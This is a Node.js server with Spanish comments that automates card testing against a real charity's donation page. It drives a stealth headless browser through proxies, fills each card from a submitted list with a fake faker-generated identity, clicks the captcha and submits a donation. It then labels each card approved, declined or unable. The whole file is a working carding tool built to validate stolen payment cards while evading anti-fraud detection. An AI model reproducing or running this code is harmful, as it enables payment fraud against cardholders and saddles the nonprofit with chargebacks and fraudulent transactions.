require('dotenv').config();
const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { faker } = require('@faker-js/faker');

// Aplicar el plugin stealth para evitar detección
puppeteer.use(StealthPlugin());

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const PROXY_STRING = process.env.PROXY_STRING || '';
const TARGET_URL = process.env.TARGET_URL || 'https://braveacademy.org/give-now-aca';
const HEADLESS = process.env.HEADLESS === 'false' ? false :
                 process.env.HEADLESS === 'new' ? 'new' : true;

let browser = null;

// ========== FUNCIÓN PARA ESPERAR SELECTOR ==========
async function waitForSelector(page, selector, timeout = 15000) {
    try {
        await page.waitForSelector(selector, { timeout, visible: true });
        return true;
    } catch (e) {
        console.log(`⏳ Selector no encontrado: ${selector}`);
        return false;
    }
}

// ========== PROXY ==========
function parseProxy(proxyStr) {
    if (!proxyStr) return null;
    // Formato: user:pass@host:port
    const match = proxyStr.match(/^(.*?):(.*?)@(.*?):(\d+)$/);
    if (match) {
        return {
            username: match[1],
            password: match[2],
            host: match[3],
            port: parseInt(match[4], 10)
        };
    }
    return null;
}

// ========== CREAR PÁGINA CON PROXY (autenticación separada) ==========
async function getNewPage() {
    if (browser) {
        await browser.close();
    }
    const proxyData = parseProxy(PROXY_STRING);
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-software-rasterizer',
        '--ignore-certificate-errors',
        '--disable-features=IsolateOrigins,site-per-process'
    ];

    if (proxyData) {
        args.push(`--proxy-server=${proxyData.host}:${proxyData.port}`);
        args.push('--proxy-bypass-list=<-loopback>');
        console.log(`🔐 Proxy configurado: ${proxyData.host}:${proxyData.port}`);
    } else {
        console.log('⚠️ Sin proxy, usando conexión directa');
    }

    const launchOptions = {
        headless: HEADLESS,
        args: args,
        ignoreHTTPSErrors: true,
        timeout: 60000
    };

    try {
        browser = await puppeteer.launch(launchOptions);
    } catch (error) {
        console.error('❌ Error al lanzar Chromium:', error.message);
        throw error;
    }

    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    if (proxyData) {
        await page.authenticate({
            username: proxyData.username,
            password: proxyData.password
        });
    }

    return page;
}

// ========== GENERAR DIRECCIÓN ==========
function generarDireccion() {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
    const street = faker.location.streetAddress();
    const city = faker.location.city();
    const state = 'CO';
    const zip = faker.location.zipCode('#####');
    return { firstName, lastName, email, street, city, state, zip };
}

// ========== LLENAR DIRECCIÓN CON TAB ==========
async function llenarDireccion(page, direccion) {
    console.log('🔍 Rellenando dirección...');
    console.log(`📦 ${direccion.firstName} ${direccion.lastName}, ${direccion.email}, ${direccion.street}, ${direccion.city}, ${direccion.zip}`);

    const firstNameSel = 'input[placeholder="First Name"]';
    await page.click(firstNameSel, { clickCount: 3 });
    await page.type(firstNameSel, direccion.firstName);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);
    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);

    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="Last Name"]', direccion.lastName);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);
    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="Email Address"]', direccion.email);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);
    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="Address Line 1"]', direccion.street);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);
    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);
    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="City"]', direccion.city);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);
    await page.keyboard.press('Tab');
    await page.waitForTimeout(200);

    await page.type('input[placeholder="Zip"]', direccion.zip);
    console.log('✅ Dirección llenada');
}

// ========== RELLENAR DATOS DE TARJETA ==========
async function rellenarDatosTarjeta(page, numero, expira, cvv) {
    if (!page) {
        throw new Error('La página no está definida en rellenarDatosTarjeta');
    }
    console.log('🔄 Rellenando tarjeta...');
    
    const frames = page.frames();
    let cardFrame = null;
    for (const f of frames) {
        try {
            const hasCardInput = await f.evaluate(() => {
                return document.querySelector('input.cc-input, input[placeholder*="Card Number"]') !== null;
            });
            if (hasCardInput) {
                cardFrame = f;
                break;
            }
        } catch (e) {}
    }
    const target = cardFrame || page;

    const numSel = 'input.cc-input, input[placeholder*="Card Number"]';
    if (await waitForSelector(target, numSel, 5000)) {
        await target.click(numSel, { clickCount: 3 });
        await target.type(numSel, numero);
    } else {
        throw new Error('Campo número no encontrado');
    }

    const expSel = 'input.exp-input, input[placeholder*="MM/YY"]';
    if (await waitForSelector(target, expSel, 5000)) {
        await target.click(expSel, { clickCount: 3 });
        await target.type(expSel, expira);
    } else {
        throw new Error('Campo fecha no encontrado');
    }

    const cvvSel = 'input.cvv-input, input[placeholder*="CVV"]';
    if (await waitForSelector(target, cvvSel, 5000)) {
        await target.click(cvvSel, { clickCount: 3 });
        await target.type(cvvSel, cvv);
    } else {
        throw new Error('Campo CVV no encontrado');
    }
    console.log('✅ Tarjeta ingresada');
}

// ========== VERIFICAR UNA TARJETA (CON REINTENTO INTERNO) ==========
async function verificarTarjetaUnica(cardData, amount, direccion, page = null, isFirstCard = false) {
    const [numero, mes, año, cvv] = cardData.split('|');
    const mesFormateado = mes.padStart(2, '0');
    const añoCorto = año.slice(-2);
    const expira = `${mesFormateado}/${añoCorto}`;

    try {
        let currentPage = page;

        // ---- PRIMERA TARJETA: crear página y navegar ----
        if (isFirstCard) {
            currentPage = await getNewPage();
            console.log(`🔍 Navegando a ${TARGET_URL}...`);
            await currentPage.goto(TARGET_URL, {
                waitUntil: 'domcontentloaded',
                timeout: 60000,
                ignoreHTTPSErrors: true
            });

            // ---- LLENAR MONTO ----
            console.log('⏳ Buscando campo de monto...');
            let montoFound = false;
            const montoSelector = 'input[data-cy="gift-amount-input-0"]';
            if (await waitForSelector(currentPage, montoSelector, 15000)) {
                await currentPage.click(montoSelector, { clickCount: 3 });
                await currentPage.type(montoSelector, amount);
                console.log('✅ Monto (data-cy)');
                montoFound = true;
            }
            if (!montoFound) {
                const fallback = 'input[placeholder="0.00"]';
                if (await waitForSelector(currentPage, fallback, 5000)) {
                    await currentPage.click(fallback, { clickCount: 3 });
                    await currentPage.type(fallback, amount);
                    console.log('✅ Monto (placeholder)');
                    montoFound = true;
                }
            }
            if (!montoFound) {
                const numInput = await currentPage.$('input[inputmode="decimal"]');
                if (numInput) {
                    await numInput.click({ clickCount: 3 });
                    await numInput.type(amount);
                    console.log('✅ Monto (inputmode)');
                    montoFound = true;
                }
            }
            if (!montoFound) {
                const inputs = await currentPage.$$('input[type="text"]');
                for (const input of inputs) {
                    const visible = await input.isVisible();
                    if (visible) {
                        const placeholder = await input.evaluate(el => el.placeholder || '');
                        if (placeholder.includes('0.00') || placeholder.includes('amount')) {
                            await input.click({ clickCount: 3 });
                            await input.type(amount);
                            console.log('✅ Monto (genérico)');
                            montoFound = true;
                            break;
                        }
                    }
                }
            }
            if (!montoFound) {
                const result = await currentPage.evaluate((amt) => {
                    const inputs = document.querySelectorAll('input[inputmode="decimal"], input[type="text"]');
                    for (const inp of inputs) {
                        if (inp.offsetParent !== null && (inp.placeholder.includes('0.00') || inp.placeholder.includes('amount'))) {
                            inp.value = amt;
                            inp.dispatchEvent(new Event('input', { bubbles: true }));
                            inp.dispatchEvent(new Event('change', { bubbles: true }));
                            return true;
                        }
                    }
                    return false;
                }, amount);
                if (result) {
                    console.log('✅ Monto (eval)');
                    montoFound = true;
                }
            }
            if (!montoFound) {
                await currentPage.screenshot({ path: 'debug_monto.png' });
                throw new Error('No se encontró el campo de monto');
            }

            // ---- ADD PAYMENT METHOD ----
            const continueBtn = '[data-cy="gift-continue-to-payment-btn"]';
            if (await waitForSelector(currentPage, continueBtn, 10000)) {
                await currentPage.click(continueBtn);
                console.log('✅ Add Payment Method');
                await currentPage.waitForTimeout(3000);
            } else {
                console.log('⚠️ Add Payment Method no encontrado, asumiendo que ya estamos en pago');
            }
        } else {
            // ---- TARJETAS SIGUIENTES: usar la misma página (ya tiene dirección) ----
            console.log('🔄 Usando página existente para siguiente tarjeta...');
        }

        // ---- ESPERA SEGURA ----
        if (!currentPage) {
            console.log('⚠️ Página perdida, creando nueva...');
            currentPage = await getNewPage();
            await currentPage.goto(TARGET_URL, {
                waitUntil: 'domcontentloaded',
                timeout: 60000,
                ignoreHTTPSErrors: true
            });
            return await verificarTarjetaUnica(cardData, amount, direccion, currentPage, true);
        }
        await currentPage.waitForTimeout(3000);

        // ---- SELECCIONAR CARD ----
        const cardBtn = '[data-cy="payment-type-card-btn"]';
        if (await waitForSelector(currentPage, cardBtn, 10000)) {
            const isActive = await currentPage.$eval(cardBtn, el => el.classList.contains('active'));
            if (!isActive) {
                await currentPage.click(cardBtn);
                console.log('✅ Card seleccionado');
                await currentPage.waitForTimeout(3000);
            }
        } else {
            try {
                await currentPage.click('text=Card');
                await currentPage.waitForTimeout(3000);
            } catch (e) {
                console.log('⚠️ No se pudo seleccionar Card');
            }
        }

        // ---- RELLENAR TARJETA ----
        await rellenarDatosTarjeta(currentPage, numero, expira, cvv);

        // ---- DIRECCIÓN ----
        if (isFirstCard) {
            await llenarDireccion(currentPage, direccion);
        } else {
            console.log('⚠️ Saltando dirección (ya guardada)');
            await currentPage.waitForTimeout(3000);
        }

        // ---- REVIEW DETAILS (con reintentos) ----
        const reviewBtn = '[data-cy="payment-save-btn"]';
        let reviewClicked = false;
        for (let attempt = 0; attempt < 3; attempt++) {
            console.log(`🔄 Intentando Review Details (${attempt+1}/3)...`);
            try {
                const exists = await currentPage.$(reviewBtn);
                if (exists) {
                    await currentPage.click(reviewBtn);
                    console.log('✅ Review Details clickeado');
                    reviewClicked = true;
                    break;
                }
            } catch (e) {}
            await currentPage.waitForTimeout(1500);
        }
        if (!reviewClicked) {
            await currentPage.evaluate((sel) => {
                const btn = document.querySelector(sel);
                if (btn) btn.click();
            }, reviewBtn);
            console.log('✅ Review Details forzado');
        }

        // ---- ESPERA DE 5 SEGUNDOS ----
        console.log('⏳ Esperando 5 segundos...');
        await currentPage.waitForTimeout(5000);

        // ---- CAPTCHA ----
        console.log('🔍 Buscando captcha...');
        const captchaSelector = 'input[type="checkbox"][aria-label="Verifique que es un ser humano"]';
        const captchaExists = await currentPage.$(captchaSelector);
        if (captchaExists) {
            console.log('✅ Captcha detectado, clic...');
            await currentPage.click(captchaSelector);
            await currentPage.waitForTimeout(5000);
        } else {
            console.log('⚠️ No se encontró captcha');
        }

        // ---- UNABLE TO PROCESS ----
        const bodyText = await currentPage.evaluate(() => document.body.innerText);
        if (bodyText.includes('UNABLE TO PROCESS')) {
            console.log('⚠️ UNABLE TO PROCESS');
            const backBtn = '[data-cy="review-back-btn"]';
            if (await waitForSelector(currentPage, backBtn, 3000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(2000);
            }
            return { resultado: 'unable', mensaje: 'UNABLE TO PROCESS', isUnable: true, page: currentPage };
        }

        // ---- BOTÓN GIVE ----
        const giveBtn = '[data-cy="review-submit-btn"]';
        const backBtn = '[data-cy="review-back-btn"]';

        try {
            await currentPage.waitForFunction(
                (sel) => {
                    const btn = document.querySelector(sel);
                    return btn && !btn.classList.contains('disabled') && !btn.disabled;
                },
                { timeout: 15000 },
                giveBtn
            );
            console.log('✅ Botón Give habilitado');
            await currentPage.click(giveBtn);
            await currentPage.waitForTimeout(3000);
        } catch (e) {
            console.log('⏳ Give no habilitado, Back...');
            if (await waitForSelector(currentPage, backBtn, 3000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(2000);
                return { resultado: 'declined', mensaje: 'Give timeout', page: currentPage };
            }
            return { resultado: 'error', mensaje: 'No se encontró Give ni Back', page: currentPage };
        }

        // ---- RESULTADO FINAL ----
        const finalText = await currentPage.evaluate(() => document.body.innerText);

        if (finalText.includes('Thank You')) {
            const screenshot = await currentPage.screenshot({ encoding: 'base64', fullPage: true });
            return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot, page: currentPage };
        } else if (finalText.includes('GIFT FAILED') || finalText.includes('Please verify your payment information')) {
            console.log('❌ GIFT FAILED, Back...');
            if (await waitForSelector(currentPage, backBtn, 3000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(2000);
                return { resultado: 'declined', mensaje: 'GIFT FAILED', page: currentPage };
            }
            return { resultado: 'declined', mensaje: 'GIFT FAILED', page: currentPage };
        } else {
            console.log('⚠️ Respuesta desconocida, Back...');
            if (await waitForSelector(currentPage, backBtn, 3000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(2000);
                return { resultado: 'error', mensaje: 'Respuesta desconocida', page: currentPage };
            }
            return { resultado: 'error', mensaje: 'Respuesta desconocida', page: currentPage };
        }

    } catch (error) {
        console.error('Error en verificación:', error);
        return { resultado: 'error', mensaje: error.message, page: page };
    }
}

// ========== ENDPOINT PARA MÚLTIPLES TARJETAS ==========
app.post('/api/check-cards', async (req, res) => {
    const { cards, amount } = req.body;
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
        return res.status(400).json({ error: 'Se requiere array de tarjetas' });
    }
    if (!amount) {
        return res.status(400).json({ error: 'Falta el monto' });
    }

    const direccion = generarDireccion();
    console.log(`📦 Dirección fija: ${direccion.firstName} ${direccion.lastName}`);

    const resultados = [];
    let unableConsecutivos = 0;
    let currentPage = null;
    let isFirstCard = true;

    for (let i = 0; i < cards.length; i++) {
        const card = cards[i];
        console.log(`\n🔹 Tarjeta ${i+1}/${cards.length}: ${card}`);

        const resultado = await verificarTarjetaUnica(card, amount, direccion, currentPage, isFirstCard);

        if (resultado.page) {
            currentPage = resultado.page;
            isFirstCard = false;
        } else {
            currentPage = null;
            isFirstCard = true;
        }

        if (resultado.resultado === 'unable') {
            unableConsecutivos++;
            if (unableConsecutivos >= 3) {
                console.log('🚨 3 UNABLE consecutivos, cerrando navegador...');
                if (browser) {
                    await browser.close();
                    browser = null;
                    currentPage = null;
                    isFirstCard = true;
                }
                unableConsecutivos = 0;
            }
        } else {
            unableConsecutivos = 0;
        }

        resultados.push({ card, resultado });
    }

    if (browser) {
        await browser.close();
        browser = null;
    }

    res.json({ resultados });
});

// ========== HEALTH CHECK ==========
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`🚀 Nirvana backend corriendo en puerto ${PORT}`);
});